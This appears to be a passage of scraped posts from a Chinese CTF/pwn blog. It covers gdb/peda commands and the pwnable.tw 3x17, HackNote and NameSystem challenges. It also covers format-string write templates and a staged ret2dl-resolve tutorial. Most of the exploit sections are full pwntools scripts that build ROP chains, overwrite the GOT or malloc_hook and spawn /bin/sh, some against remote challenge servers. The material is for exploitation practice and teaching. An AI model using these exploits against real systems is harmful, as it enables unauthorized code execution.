调试的快捷键peda带有的功能，直接输入命令，其就会给予提示（如果不是这样，基本上也是该命令就可以不带参数）。这儿就不多做介绍 1.1 基础的调试快捷键 s step，si步入 n 执行下一条指令 ni步入 b 在某处下断点，可以用 b * adrress b function_name info b 查看断点信息 delete 1删除第一个断点 c 继续 r 执行 disas addr 查看addr处前后的反汇编代码 1.2 显示数据 p 系列 p system/main 显示某个函数地址 p $esp 显示寄存器 p/x p/a p/b p/s。。。 p 0xff - 0xea 计算器 print &amp;VarName 查看变量地址 p * 0xffffebac 查看某个地址处的值 x系列 x/xw addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表 x/x $esp 查看esp寄存器中的值 x/s addr 查看addr处的字符串 x/b addr 查看addr处的字符 x/i addr 查看addr处的反汇编结果 x/ngx addr 显示某个地址处开始的十六进制内容，以八字节位单位显示n个 info系列 info register $ebp 查看寄存器ebp中的内容 (简写为 i r ebp) i r eflags 查看状态寄存器 i r ss 查看段寄存器 i b 查看断点信息 i functions 查看所有的函数 disas addr 查看addr处前后的反汇编代码 stack 20 查看栈内20个值 show args 查看参数 vmmap 查看映射状况 peda带有 readelf 查看elf文件中各个段的起始地址 peda带有 parseheap 显示堆状况 peda带有 1.3 查找数据 find 查找字符串 peda带有 searchmem 查找字符串 peda带有 1.4 修改数据 set $esp=0x110 修改寄存器的值 set *0xf7ff3234=0x08042334 修改内存的值 set args &quot;asdasg&quot; &quot;afdasgasg&quot; &quot;agasdsa&quot; 分别给参数1,2,3赋值 set args “python -c &#39;print &quot;1234\\x7f\\xde&quot;&#39;“ 这个参数中用python脚本重写了一下，避免有些字符无法正确设置 r &quot;arg1&quot; &quot;arg2&quot; &quot;arg3&quot;设置参数 2. 查找某个plt、got、plt_2 plt 可以直接使用pwntools中的ELF(elf).symbols(function_name) got 可以直接使用pwntools中的ELF(elf).got(function_name) plt_2 可以直接使用pwntools中的ELF(lib).symbols(function_name) 3. 查找程序所动态链接的库 file pwn3 pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=916959406d0c545f6971223c8e06bff1ed9ae74d, not stripped checksec pwn3 [*] ‘/root/Desktop/Pwnable/fmt/normal/fmt_string_write_got/pwn3’Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) ldd pwn3 linux-gate.so.1 (0xf77ad000)libc.so.6 =&gt; /lib32/libc.so.6 (0xf75d2000)/lib/ld-linux.so.2 (0x56601000) 4.堆操作 tracemalloc on跟踪每次malloc parseheap 把堆的布局输出 heapinfo展示heap的信息 5.开启和关闭ALSRASLR 的等级可以通过一个内核参数 randomize_va_space 来进行控制，查看其值即可知道当前系统的 ASLR 的等级，如下： 0：关闭ASLR 1sudo bash -c \"echo 0 &gt; /proc/sys/kernel/randomize_va_space\" 1：保留的ASLR 1sudo bash -c \"echo 1 &gt; /proc/sys/kernel/randomize_va_space\" 2：完全的ASLR 1sudo bash -c \"echo 2 &gt; /proc/sys/kernel/randomize_va_space\"","tags":[{"name":"工具","slug":"工具","permalink":"wood1314.github.io/tags/工具/"}]},{"title":"pwnable-tw-3x17","date":"2020-01-02T02:05:53.000Z","path":"year/01/02/cl6ewlda8002uj63fd444ijd5/","text":"停课复习了，闲暇时可以刷刷pwn，writeup参考和媳妇一起学Pwn 之 3x17 0x01 寻找main函数这道题是静态链接，很多函数没有直接给出名称，一开始比较明显的只能定位到start。寻找main函数的话有两种方法： 1.1 查找字符串我们可以直接按查找字符串，寻找运行程序时出现的字符串，然后看这个字符串在那个函数里被使用过就可以了。 现在找到了addr这个字符串 然后点击后面那个函数就可以进入main函数了 1.2 根据start函数的参数这个涉及到glibc入口函数的知识，我前面写博客总结过，《程序员的自我修养11章》有比较详细的介绍，总结来说start函数的伪代码如下 1234567void _start()&#123; %ebp = 0; int argc = pop from stack char ** argv = top of stack _libc_start_main( main, argc, argv, libc_csu_init, libc_csu_fini, edx, top of stack)&#125; 由此可以判断出此题start函数的基本结构，这样同样可以锁定main函数。 0x02 分析程序逻辑先上main函数，这里把一眼能看出来的read和write都已经标好，但是有一个sub_3b9330好像看不出来是什么东西，而且点进去之后那个代码好复杂，顿时就不想看了。但可以看出来逻辑大概是： 读入一个数据 把这个数据转化成一个地址 然后向这个地址里写内容 所以还是动态调试一下，看看这个看不出功能的函数是什么功能吧 随意输入一个16，然后发现返回值是0x10，看来这个函数是一个把字符串转化成整形的一个函数 程序逻辑就是 一个0x18字节的任意地址写 0x03 漏洞利用然而这个程序没有泄露栈地址，所以我也不知道返回地址在什么位置，而且这个程序没有后门函数，只能利用rop或者shellcode，所以0x18个字节的写入完全不够。 其实如果是有经验的大佬可以直接想到利用libc_csu_fini,但是很多时候我们并不清楚这个知识点，难道这题就做不出来了么？（好吧，还真的是做不出来） 但还是要尽量找一下程序里有什么地方是不是可以控制rip，比如下面这部分 12345678910111213141516171819202122232425.text:0000000000402960 sub_402960 proc near ; DATA XREF: start+F↑o.text:0000000000402960 ; __unwind &#123;.text:0000000000402960 push rbp.text:0000000000402961 lea rax, unk_4B4100.text:0000000000402968 lea rbp, off_4B40F0.text:000000000040296F push rbx.text:0000000000402970 sub rax, rbp.text:0000000000402973 sub rsp, 8.text:0000000000402977 sar rax, 3.text:000000000040297B jz short loc_402996.text:000000000040297D lea rbx, [rax-1].text:0000000000402981 nop dword ptr [rax+00000000h].text:0000000000402988.text:0000000000402988 loc_402988: ; CODE XREF: sub_402960+34↓j.text:0000000000402988 call qword ptr [rbp+rbx*8+0].text:000000000040298C sub rbx, 1.text:0000000000402990 cmp rbx, 0FFFFFFFFFFFFFFFFh.text:0000000000402994 jnz short loc_402988.text:0000000000402996.text:0000000000402996 loc_402996: ; CODE XREF: sub_402960+1B↑j.text:0000000000402996 add rsp, 8.text:000000000040299A pop rbx.text:000000000040299B pop rbp.text:000000000040299C jmp sub_48E32C.text:000000000040299C ; &#125; // starts at 402960 3.1 libc_csu_fini还记的__libc_start_main的几个参数里有两个东西么（init,fini），这俩是个啥呢？ 12.text:0000000000401A5F mov r8, offset sub_402960.text:0000000000401A66 mov rcx, offset loc_4028D0 这俩其实就是两个函数的地址，分别是：libc_csu_fini（sub_402960），libc_csu_init（loc_4028D0），至于为啥init的被IDA识别成loc，就不知道了。因为是静态编译的，这两个本身是libc的函数，但是可以在这个二进制中直接点进去看到函数的实现。 顾名思义，一个是init，开始时函数。一个是fini，结束时的函数。所以可见main函数的地位并没有我们刚接触c语言是那么至高无上，他既不是程序执行时的第一个函数，也不是最后一个函数。 另外在IDA的 view -&gt; open subviews -&gt; segments可以看到如下四个段： .init .init_array .fini .fini_array 并且可以看到init和fini都是函数，而init_arry和fini_arry都是数组，所在空间有可读写权限，他们的执行顺序为： __libc_csu_init main __libc_csu_fini 更精细的执行顺序如下： .init .init_array[0] .init_array[1] … .init_array[n] main .fini_array[n] … .fini_array[1] .fini_array[0] .fini 所以无论是看汇编还是源码，都能看出来，.fini_array数组中的函数是倒着调用的。题目中的off_4B40F0这个地址，就是.fini_array： 3.2 覆写fini_arry我们如果把.fini_array[1]覆盖成main，把 .fini_array[0]覆盖成 __libc_csu_fini，这可以样就可以一直循环调用main函数啦！但好像看起来还是无法写多次啊，因为byte_4B9330这个全局变量一直在自增啊，永远比1大呀。观察一下这个变量： 1(unsigned __int8)++byte_4B9330 这是8bit的整型，从byte_4B9330这个变量名也能看出来（byte），所以当我们按照如上的方法改写.fini_array段，这个变量会疯狂加一，自增一会就溢出了，然后又会回到1，然后就会停到read系统调用等待写入，就又可以写了。 3.2 栈迁移123.text:0000000000402960 push rbp.text:0000000000402968 lea rbp, off_4B40F0 ; fini_array.text:0000000000402988 call qword ptr [rbp+rbx*8+0] ; 调用fini_array的函数 可见在这个函数中rbp之前的值暂时被放到栈里了，然后将rbp当做通用寄存器去存放了一个固定的值0x4b40f0，然后就去调用了fini_array的函数，call之后的指令我们就可控了，我们可以劫持RIP到任何地方。考虑如下情况： 123456lea rbp, off_4B40F0 ; rbp = 0x4b40f0 , rsp = 未知; 劫持到这mov rsp,rbp ; rbp = 0x4b40f0 , rsp = 0x4b40f0pop rbp ; rbp = [rsp] = [0x4b40f0] , rsp = 0x4b40f8ret ; rip = [rsp] = [0x4b40f8] , rsp = 0x4b4100 则rsp被劫持到0x4b4100，rip和rbp分别为.fini_array[1]和.fini_array[0]的内容 则我们可以在0x4b4100的地址向上布置rop链，只要rip指向的位置的代码不会破坏高地址栈结构，然后还有个ret指令，那么就可以实现ROP啦。所以我们要完成三件事： 布置好从0x4b4100开始的栈空间(利用任意地址写) 保证.fini_array[1]指向的代码不破坏栈结构，还有个ret，或者直接就一句ret也行 通过上文类似的方法劫持rsp到0x4b4100，即可触发ROP 3.3 exp123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context(arch=\"amd64\",os='linux',log_level='debug')myelf = ELF(\"./3x17\")#io = process(myelf.path)#gdb.attach(io,\"b * 0x471db5\")io = remote(\"chall.pwnable.tw\",10105)rop_syscall = 0x471db5rop_pop_rax = 0x41e4afrop_pop_rdx = 0x446e35rop_pop_rsi = 0x406c30rop_pop_rdi = 0x401696bin_sh_addr = 0x4B419Afini_array = 0x4B40F0main_addr = 0x401B6Dlibc_csu_fini = 0x402960leave_ret = 0x401C4Besp = 0x4B4100def write(addr,data): io.recv() io.send(str(addr)) io.recv() io.send(data)write(fini_array,p64(libc_csu_fini)+p64(main_addr))write(bin_sh_addr,\"/bin/sh\\x00\")write(esp,p64(rop_pop_rax))write(esp+8,p64(0x3b))write(esp+16,p64(rop_pop_rdi))write(esp+24,p64(bin_sh_addr))write(esp+32,p64(rop_pop_rdx))write(esp+40,p64(0))write(esp+48,p64(rop_pop_rsi))write(esp+56,p64(0))write(esp+64,p64(rop_syscall))write(fini_array,p64(leave_ret))io.interactive() 0x04 总结这道题设计的很巧妙： 最开始时只有一次任意地址写，通过修改.fini_array段，利用__libc_csu_fini函数性质构造循环调用main函数，并溢出检查字段绕，变成多次任意地址写 继续利用任意地址写和__libc_csu_fini函数性质，迁移rsp，并劫持rip，完成ROP 这道题给我带来的新思路和收获 碰到复杂函数不必急于看代码，可以先动态调试一下，猜测它的功能 巩固了程序入口函数的知识 寻找利用途径时可以多关注可以控制程序ip的地方 可以想办法让一次任意地址读变为多次任意地址读","tags":[]},{"title":"湖湘杯复赛题目-writeup","date":"2019-11-13T04:59:11.000Z","path":"year/11/13/cl6ewldbd005gj63fy2pq1wax/","text":"还是要多刷多复现堆题啊 0x01 HackNodte分析这道题是静态链接，修改时用的是strlen,造成了off-by-one，所以堆重叠。然后把chunk分配到main_arena上，再修改unsortedbin,分配到malloc_hook上 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *sh = process('./HackNote')gdb.attach(sh,'b*0x400BFD')malloc_hook = 0x6CB788free_hook = 0x6CD5E8def add(size,content): sh.sendlineafter('-----------------\\n','1') sh.sendlineafter(':\\n',str(size)) sh.sendafter(':\\n',content)def delete(idx): sh.sendlineafter('-----------------\\n','2') sh.sendlineafter(':\\n',str(idx))def edit(idx,content): sh.sendlineafter('-----------------\\n','3') sh.sendlineafter(':\\n',str(idx)) sh.sendafter(':\\n',content)context(os = 'linux',arch = 'amd64')add(0x108, \"a\\n\")#0add(0x220, \"b\" * 0x1f0 + p64(0x200) + \"\\n\")#1add(0x100, \"c\\n\")#2add(0x100,'d\\n')#3edit(0,0x108*'a') delete(1)edit(0,0x108*'a'+'\\n')add(0xe0,'a\\n') #1add(0x50,'b\\n') #4add(0x60,'c\\n') #5delete(1)delete(2)add(0x330,'a\\n') #1delete(4)delete(5)edit(1,'e'*0xe8 + p64(0x60)+p64(0x71)+p64(0)*10+p64(0x71)+p64(0x6cb820)+'\\n')add(0x50,'c\\n') #4 向main_arena中写入0x71add(0x60,'d\\n') #5 add(0x60,p64(0) * 5 + p64(0x6CB788 - 0x10) + \"\\n\" )#5 分配到main_arena并修改unsortedbinadd(0x60, p64(0x6cb790) + asm(shellcraft.sh()) + \"\\n\")#5 向malloc_hook中写入shellcodesh.sendlineafter('-----------------\\n','1')sh.sendlineafter(':\\n','1')sh.interactive() 0x02 NameSystem这道题有个uaf一开始还真没看出来。。。。先把bss段上的一个堆指针改成got表上的内容，再把free的got表内容改成puts@plt，从而可以泄露libc，最后再把free@got改成system，然后执行就可以获得shell。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *def add(size, content): r.sendline(\"1\") r.sendlineafter(\"Name Size:\", str(size)) r.sendlineafter(\"Name:\", content) r.recvuntil(\"Your choice :\\n\")def dele(index): r.sendline(\"3\") r.sendlineafter(\"The id you want to delete:\", str(index)) r.recvuntil(\"Your choice :\\n\")#r = process(\"./NameSystem\")r = remote(\"183.129.189.62\", \"15505\")r.recvuntil(\"Your choice :\\n\")for i in range(18): add(0x40, \"a\")add(0x60, \"a\")add(0x60, \"a\")dele(0)dele(18)dele(17)dele(19)dele(0)add(0x50, \"a\")add(0x50, \"a\")dele(0)dele(18)dele(17)dele(19)dele(0)add(0x30, \"a\")add(0x30, \"a\")dele(0)dele(18)dele(17)dele(19)for i in range(13): dele(0)add(0x60, p64(0x60208d))add(0x60, p64(0))add(0x60, \"/bin/sh\\x00\")add(0x60, \"\\x00\" * 3 + p64(0x602060))add(0x50, p64(0x601ffa))add(0x50, p64(0))add(0x50, \"/bin/sh\\x00\")add(0x50, \"\\x00\" * 6 + p64(0x41) + p32(0x4006A0) + \"\\x00\" * 3)r.sendline(\"3\")r.sendlineafter(\"The id you want to delete:\", str(0))libc = u64(r.recvuntil(\"\\n\").ljust(8, \"\\x00\")) + 0x7fb44b795000 - 0xa7fb44b7cbe80add(0x30, p64(0x602008))add(0x30, p64(0))add(0x30, \"/bin/sh\\x00\")add(0x30, p64(libc + 0x45390)[:7])r.sendline(\"3\")r.sendlineafter(\"The id you want to delete:\", str(15))#gdb.attach(r)print \"libc: \" + hex(libc)r.interactive()","tags":[{"name":"堆重叠","slug":"堆重叠","permalink":"wood1314.github.io/tags/堆重叠/"}]},{"title":"格式化字符串漏洞","date":"2019-11-03T15:23:14.000Z","path":"year/11/03/cl6ewldbb005dj63fa6saxqef/","text":"0x00 Emm。。。今天做了个河北师范大学招新赛的题，发现好多格式化字符串的题目，以前确实做的很少，正好现在重新总结下。 0x01 格式化字符串漏洞原理格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况 当前字符不是 %，直接输出到相应标准输出。 当前字符是 %， 继续读取下一个字符 如果没有字符，报错 如果下一个字符是 %, 输出 % 否则根据相应的字符，获取相应的参数，对其进行解析并输出 那么假设，此时我们在编写程序时候，写成了下面的样子 1printf(\"Color %s, Number %d, Float %4.2f\"); 此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为 解析其地址对应的字符串 解析其内容对应的整形值 解析其内容对应的浮点值 0x02 格式化字符串漏洞的利用主要利用情况有： 泄露栈上的数据 任意地址读 任意地址写 0x03 任意地址写模板32位1234567891011121314151617181920212223242526def fmt(prev, word, index): if prev &lt; word: result = word - prev fmtstr = \"%\" + str(result) + \"c\" elif prev == word: result = 0 else: result = 256 + word - prev fmtstr = \"%\" + str(result) + \"c\" fmtstr += \"%\" + str(index) + \"$hhn\" return fmtstrdef fmt_str(offset, size, addr, target): payload = \"\" for i in range(4): if size == 4: payload += p32(addr + i) else: payload += p64(addr + i) prev = len(payload) for i in range(4): payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i) prev = (target &gt;&gt; i * 8) &amp; 0xff return payloadpayload = fmt_str(6,4,0x0804A028,0x12345678) 值得注意的是因为64位地址有\\x00会导致printf输出被截断，所以64位的话要把要修改的地址放在后面才行 64位1234567891011121314151617181920212223def fmt(prev, word, index): if prev &lt; word: result = word - prev fmtstr = \"%\" + str(result) + \"c\" elif prev == word: result = 0 else: result = 256 + word - prev fmtstr = \"%\" + str(result) + \"c\" fmtstr += \"%\" + str(index) + \"$hhn\" return fmtstrtarget = system_addrprev = 0payload = ''for i in range(4): payload += fmt(prev, (target&gt;&gt;i*8) &amp; 0xff, 22+i) prev = (target&gt;&gt;i*8) &amp; 0xffpayload = payload.ljust(0x80,'\\x00')payload += p64(printf_got)payload += p64(printf_got + 1)payload += p64(printf_got + 2)payload += p64(printf_got + 3) 个人经验算完偏移用aaaaaaaa%n$p试一下，会稳很多 0x04 参考ctfwiki: https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/","tags":[]},{"title":"Return-to-dl-resolve总结","date":"2019-11-01T11:01:36.000Z","path":"year/11/01/cl6ewld9h0019j63fdh2xk69v/","text":"0x00 前言这个利用方式跟重定位和动态链接有关，现在复习跟总结下 0x01 准备知识延迟绑定为了减少存储器浪费，现代操作系统支持动态链接特性。即不是在程序编译的时候就把外部的库函数编译进去，而是在运行时再把包含有对应函数的库加载到内存里。由于内存空间有限，选用函数库的组合无限，显然程序不可能在运行之前就知道自己用到的函数会在哪个地址上。比如说对于libc.so来说，我们要求把它加载到地址0x1000处，A程序只引用了libc.so，从理论上来说这个要求不难办到。但是对于用了liba,so, libb.so, libc.so……liby.so, libz.so的B程序来说，0x1000这个地址可能就被liba.so等库占据了。因此，程序在运行时碰到了外部符号，就需要去找到它们真正的内存地址，这个过程被称为重定位。为了安全，现代操作系统的设计要求代码所在的内存必须是不可修改的，那么诸如call read一类的指令即没办法在编译阶段直接指向read函数所在地址，又没办法在运行时修改成read函数所在地址，怎么保证CPU在运行到这行指令时能正确跳到read函数呢？这就需要got表（Global Offset Table，全局偏移表）和plt表（Procedure Linkage Table，过程链接表）进行辅助了。 调用流程来看一下一个setvbuf函数的调用过程 jmp到了setvbug函数对应的got表位置，这个时候got表中存储的是该函数plt表中的下一条指令，相当于没跳转。 push了一个0x20，这个代表这个函数的id号，后面要用这个来寻找它的重定位表项 jump到plt[0],push了link_map. 最后jump到了dl_resolve 函数.对符号进行解析 调用的流程图如下 相关结构.dynamic这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针 .dynstr一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对0x804821C的偏移。) .dynsym这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下 123456789typedef struct&#123; Elf32_Word st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了 Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; //对于导入函数符号而言，它是0x12 unsigned char st_other; Elf32_Section st_shndx;&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0 .rel.plt这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下： 12345678typedef struct&#123; Elf32_Addr r_offset; //指向GOT表的指针 Elf32_Word r_info; //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07 //1和3是这个导入函数的符号在.dynsym中的下标， //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应&#125; Elf32_Rel; _dl_fixup是在glibc-2.23/elf/dl-runtime.c实现的，我们只关注一些主要函数。 123456789101112131415_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)&#123; // 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); // 然后通过reloc-&gt;r_info找到.dynsym中对应的条目 const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; // 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7 assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); // 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址 result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); // value为libc基址加上要解析函数的偏移地址，也即实际地址 value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0); // 最后把value写入相应的GOT表条目中 return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);&#125; _dl_runtime_resolve会 用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针 .rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym .dynstr + sym-&gt;st_name得出符号名字符串指针 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表 调用这个函数 实际上好像都是把st_name转成hash值在libc函数里进行查找的，不过我也没仔细看源码，不是很确定 0x02 漏洞利用方式 控制eip为PLT[0]的地址，只需传递一个index_arg参数 控制index_arg的大小，使reloc的位置落在可控地址内 伪造reloc的内容，使sym落在可控地址内 伪造sym的内容，使name落在可控地址内 伪造name为任意库函数，如system 此外，这个攻击成功的很必要的条件 dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。 dl_resolve 函数最后的解析根本上依赖于所给定的字符串。stage1我们先写一个ROP链，直到返回到write@plt12345678910111213141516171819202122232425262728293031323334353637383940414243#!/usr/bin/pythonfrom pwn import *elf = ELF('bof')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only \"pop|ret\"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only \"leave|ret\"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep \".bss\"base_stage = bss_addr + stack_sizer = process('./bof')r.recvuntil('Welcome to XDCTF2015~!\\n')payload = 'A' * offsetpayload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stager.sendline(payload)cmd = \"/bin/sh\"payload2 = 'AAAA' # 接上一个payload的leave-&gt;pop ebp ; retpayload2 += p32(write_plt)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage2这次控制eip返回PLT[0]，要带上write的index_offset。这里修改一下payload2 1234567891011121314151617...cmd = \"/bin/sh\"plt_0 = 0x08048380 # objdump -d -j .plt bofindex_offset = 0x20 # write's indexpayload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage3这次控制index_offset，使其指向我们构造的fake_reloc 12345678910111213141516171819202122...cmd = \"/bin/sh\"plt_0 = 0x08048380 # objdump -d -j .plt bofrel_plt = 0x08048330 # objdump -s -j .rel.plt bofindex_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移write_got = elf.got['write']r_info = 0x607 # write: Elf32_Rel-&gt;r_infofake_reloc = p32(write_got) + p32(r_info)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage4这一次构造fake_sym，使其指向我们控制的st_name 1234567891011121314151617181920212223242526272829303132...cmd = \"/bin/sh\"plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got['write']dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = 0x4cfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += 'B' * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage5把st_name指向输入的字符串&quot;write&quot; 123456789101112131415161718192021222324252627282930313233...cmd = \"/bin/sh\"plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got['write']dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += 'B' * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += \"write\\x00\"payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage6替换write为system，并修改system的参数 123456789101112131415161718192021222324252627282930313233...cmd = \"/bin/sh\"plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got['write']dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(base_stage + 80)payload2 += 'aaaa'payload2 += 'aaaa'payload2 += fake_reloc # (base_stage+28)的位置payload2 += 'B' * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += \"system\\x00\"payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() 得到一个shell 0x03 工具攻击根据上面的介绍，我们应该很容易可以理解这个攻击了。下面我们直接使用 roputil 来进行攻击。代码如下 12345678910111213141516171819202122232425from roputils import *from pwn import processfrom pwn import gdbfrom pwn import contextr = process('./main')context.log_level = 'debug'r.recv()rop = ROP('./main')offset = 112bss_base = rop.section('.bss')buf = rop.fill(offset)buf += rop.call('read', 0, bss_base, 100)## used to call dl_Resolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)r.send(buf)buf = rop.string('/bin/sh')buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, 'system')buf += rop.fill(100, buf)r.send(buf)r.interactive() 再放一段不用工具的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#coding:utf-8from pwn import *context(os='linux',arch='i386')#context.log_level = 'debug'p = process('./pwn')P = ELF('./pwn')lr = 0x08048448bss = 0x0804aa00pppr_addr = 0x080485d9pop_ebp = 0x080485dbpayload = (0x28+4) * 'a'payload+= p32(P.plt['read'])payload+= p32(pppr_addr)payload+= p32(0)payload+= p32(bss) payload+= p32(0x400)payload+= p32(pop_ebp)payload+= p32(bss)payload+= p32(lr)p.send(payload)sleep(1)plt_0 = 0x08048380r_info = 0x107rel_plt = 0x0804833c dynsym = 0x080481dcdynstr = 0x0804827cfake_sys_addr = bss + 36align = 0x10 - ((fake_sys_addr-dynsym)&amp;0xf)fake_sys_addr = fake_sys_addr + alignindex = (fake_sys_addr - dynsym)/0x10r_info = (index &lt;&lt; 8) + 0x7st_name = (fake_sys_addr + 0x10) - dynstrfake_sys = p32(st_name) + p32(0) + p32(0) + p32(0x12) fake_rel = p32(P.got['read']) + 